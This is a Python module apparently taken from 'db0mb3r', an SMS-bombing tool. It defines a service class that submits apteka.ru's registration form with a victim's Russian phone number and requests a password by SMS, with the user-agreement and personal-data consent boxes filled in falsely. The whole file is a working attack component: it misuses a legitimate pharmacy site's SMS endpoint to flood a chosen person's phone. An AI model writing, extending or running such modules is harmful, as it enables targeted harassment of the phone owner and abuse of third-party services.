from db0mb3r.services.service import Service


class Apteka(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": self.format(self.formatted_phone, "+* (***) ***-**-**"),
                "form[PASSWORD]": self.password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
